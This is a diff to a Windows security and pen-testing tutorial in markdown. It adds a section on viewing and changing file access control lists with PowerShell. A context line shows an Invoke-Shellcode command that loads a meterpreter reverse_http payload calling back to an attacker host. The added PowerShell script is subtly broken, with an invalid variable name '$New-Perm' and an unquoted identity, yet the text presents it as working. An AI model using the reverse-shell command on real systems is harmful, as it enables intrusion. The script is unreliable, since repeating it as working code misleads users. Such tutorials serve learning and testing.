@@ -17,6 +17,7 @@
 4. Windows Powershell
 	- 4.1 Powershell Commands
 	- 4.2 Powershell Exploitation / Pen-testing Frameworks
+	- 4.3 Powershell Access Control Lists (ACL)
 5. Windows Registry
 	- 5.1 Overview
 	- 5.2 CLSID
@@ -443,6 +444,37 @@ PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost [ATTACKER
 
 Feel free to explore more of it if you so wish!
 
+#### 4.3 Powershell Access Control Lists (ACL)
+Microsoft files / directories too have permissions in the form of Access Control Lists. For instance the following command displays access control for a particular directory (e.g. `C:\secret`):
+```powershell
+((Get-Item C:\secret).GetAccessControl('ACCESS')).Access
+```
+
+Consider the following sample output of the above command:
+```powershell
+FileSystemRights  : ReadAndExecute
+AccessControlType : Allow
+IdentityReference : My-PC\ary
+IsInherited       : False
+InheritanceFlags  : ContainerInherit, ObjectInherit
+PropagationFlags  : None
+```
+Note that over here IdentitiyReference typically goes by DOMAIN\name when we try to recognize users / groups.
+
+Suppose I want to modify `C:\secret`, then I can assign myself the following permissions using the following mini Powershell script (yes you can script things!:
+```powershell
+$Acl = (Get-Item C:\secret).GetAccessControl('Access')
+$New-Perm = New-Object System.Security.AccessControl.FileSystemAccessRule(My-PC\ary, 'Modify',                 'ContainerInherit,ObjectInherit', 'None', 'Allow')
+$Acl.setAccessRule($New-Perm)
+Set-Acl -Path C:\secret -AclObject $Acl
+```
+Basically, we assign `$Acl` to the current ACL settings. Then, we create new permission setting `$New-Perm` that allows the My-PC\ary user to modify `C:\secret` and this applies to all folders (ContainerInherit) and files (ObjectInherit) underneath it. We finally apply the new access rule using `Set-Acl`.
+
+In case it is difficult to understand, it is (roughly) equvalent to the following in a Linux bash shell (asuming My-PC\ary is owner):
+```bash
+chmod u+w -R /secret
+```
+
 ---
 
 ### 5. Windows Registry
@@ -666,4 +698,4 @@ Many other mitigation techniques (e.g. [Heap Protection](https://blogs.technet.m
 
 ## The End
 
-Thanks for reading through this whole document, hope you learnt something! :) [Also GitHub Markdown :(]
+Thanks for reading through this whole document, hope you learnt something! :) But Github Markdown :'(
